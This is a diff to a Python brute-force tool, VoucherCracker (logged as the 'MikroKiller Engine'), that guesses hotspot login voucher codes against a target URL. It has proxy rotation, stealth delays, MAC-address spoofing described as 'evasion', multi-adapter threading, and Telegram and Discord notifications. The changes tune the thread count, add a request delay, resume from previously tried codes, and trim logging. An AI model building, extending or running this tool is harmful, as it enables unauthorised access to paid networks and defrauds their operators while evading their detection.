@@ -29,7 +29,7 @@ class ProxyManager :
 class VoucherCracker :
 
     def __init__(self, target_url, auth_mode ='both', session_name ='session',
-    threads =50, user_field ='username', user_static_val ='',
+    threads =5, user_field ='username', user_static_val ='',
     user_char_type ='digits', user_min_len =8, user_max_len =8,
     user_start ='', user_end ='', user_contains ='', user_letter_case ='lowercase',
     pass_field ='password', pass_static_val ='',
@@ -37,7 +37,7 @@ class VoucherCracker :
     pass_start ='', pass_end ='', pass_contains ='', pass_letter_case ='lowercase',
     analytic_mode =False, manual_samples ='',
     user_use_luhn =False, pass_use_luhn =False,
-    proxies =None, stealth =False, auto_spoof =False,
+    proxies =None, stealth =False, delay =0, auto_spoof =False,
     telegram_token ='', telegram_chat ='',
     discord_webhook ='', discord_token ='', discord_channel ='',
     stop_after =1, bound_adapter_ips =None, **kwargs):
@@ -45,7 +45,7 @@ class VoucherCracker :
         self.target_url =target_url
         self.auth_mode =auth_mode
         self.session_name =session_name
-        self.threads =int(threads or 50)
+        self.threads =max(min(int(threads or 5), 20), 5)
 
         self.user_field =user_field
         self.user_static_val =user_static_val
@@ -72,6 +72,7 @@ class VoucherCracker :
         self.analytic_mode =analytic_mode
         self.proxy_mgr =ProxyManager(proxies)
         self.stealth =stealth
+        self.delay =float(delay or 0)
         self.auto_spoof =auto_spoof
         self.tg_token =telegram_token
         self.tg_chat =telegram_chat
@@ -295,6 +296,9 @@ class VoucherCracker :
         if self.stealth :
             time.sleep(random.uniform(0.1, 0.4))
 
+        if self.delay :
+            time.sleep(self.delay)
+
         payload ={}
         if self.auth_mode =='username':
             payload [self.user_field]=user
@@ -404,12 +408,9 @@ class VoucherCracker :
             origin_info =self.origin_wifi_info .get(adapter_ip)
 
             if not origin_info or not origin_info.get('ssid'):
-                self.log(f'[+] Evasion complete for {adapter_ip} (LAN mode — no network check needed).')
                 with self.lock :
                     self._spoofing_ips .discard(adapter_ip)
                 return
-
-            self.log(f'[*] Waiting for Wi-Fi reconnect on {adapter_ip}...')
             reconnected_info =None
             alias =self.ip_to_alias .get(adapter_ip)
 
@@ -436,7 +437,6 @@ class VoucherCracker :
                 return
 
             if reconnected_info ['ssid']==origin_info ['ssid']:
-                self.log()
                 with self.lock :
                     self._spoofing_ips .discard(adapter_ip)
             else :
@@ -455,8 +455,6 @@ class VoucherCracker :
         msg_ssid =connected_ssid if connected_ssid else '(not connected)'
         expected_ssid =self.origin_wifi_info .get(adapter_ip, {}).get('ssid', 'Unknown')
 
-        self.log()
-
         if callable(getattr(self, 'on_wrong_network', None)):
             self.on_wrong_network(expected_ssid, msg_ssid, new_mac)
 
@@ -471,34 +469,39 @@ class VoucherCracker :
         self.saved_valid =set()
 
         import os, shutil
-        if os.path .exists(self.valid_file)and os.path .getsize(self.valid_file)>0 :
-            backup =self.valid_file .replace('.txt', '_backup.txt')
-            shutil.copy2(self.valid_file, backup)
+
+        if os.path.exists(self.invalid_file) and os.path.getsize(self.invalid_file) > 0:
+            with open(self.invalid_file) as f:
+                for line in f:
+                    key = line.strip()
+                    if key:
+                        self.tried_pairs.add(key)
+
+        for f in (self.valid_file, self.invalid_file):
+            if os.path.exists(f) and os.path.getsize(f) > 0:
+                backup = f.replace('.txt', '_backup.txt')
+                shutil.copy2(f, backup)
 
         open(self.valid_file, 'w').close()
+        open(self.invalid_file, 'w').close()
 
-        self.log(f'[-] MikroKiller Engine Active.Targeting {self.target_url}')
+        self.log(f'[-] Engine active — {self.target_url}')
 
         is_localhost =('127.0.0.1'in self.target_url or 'localhost'in self.target_url)
         
         if self.bound_adapter_ips and not is_localhost :
-            self.log(f'[-] Bound to {len(self.bound_adapter_ips)} adapters: {", ".join(self.bound_adapter_ips)}')
+            self.log(f'[-] Bound to {len(self.bound_adapter_ips)} adapter(s)')
             for ip in self.bound_adapter_ips :
                 alias =self.ip_to_alias .get(ip)
                 wifi =get_current_wifi_info(adapter_ip =None, adapter_alias =alias)
                 if wifi and wifi.get('ssid'):
                     self.origin_wifi_info [ip]=wifi
-                    self.log(f'[-] Adapter {ip} Network: "{wifi["ssid"]}"')
-                else :
-                    self.log(f'[-] Adapter {ip} LAN/localhost mode — network check disabled.')
         elif is_localhost :
-            self.log('[-] Localhost target detected — using default adapter (adapter binding disabled for localhost)')
+            self.log('[-] Localhost target')
         else :
-            self.log('[-] Bound to default adapter')
             wifi =get_current_wifi_info()
             if wifi and wifi.get('ssid'):
                 self.origin_wifi_info [None]=wifi
-                self.log(f'[-] Network: "{wifi["ssid"]}"')
 
         try :
             self.sessions [0][0].get(self.target_url, timeout =5, verify =False)
@@ -529,10 +532,6 @@ class VoucherCracker :
 
                     needed_total_workers =self.threads *num_adapters
                     if executor is None or needed_total_workers !=current_total_workers :
-                        if executor :
-                            self.log(f'[*] Scaling thread pool from {current_total_workers} to {needed_total_workers}...')
-                        else :
-                            self.log(f'[-] Initializing {needed_total_workers} total threads({self.threads} per adapter).')
                         current_total_workers =needed_total_workers
                         executor =concurrent.futures .ThreadPoolExecutor(max_workers =current_total_workers)
 
@@ -594,12 +593,6 @@ class VoucherCracker :
                             f_inv.write(label +'\n')
 
                     f_inv.flush()
-
-                    if self.total_tried >0 and self.total_tried %50 ==0 :
-                        elapsed =max(self.elapsed_time, 0.001)
-                        rps =round(self.total_tried /elapsed, 1)
-                        success_rate =round((self.valid_found /self.total_tried *100), 1)if self.total_tried >0 else 0
-                        self.log(f'├─ Progress: {self.total_tried} attempts | ⚡ {rps} req/s | ✅ {self.valid_found} valid | Success: {success_rate}%')
 
         except Exception as e :
             self.log(f'[!] Critical Error: {e}')
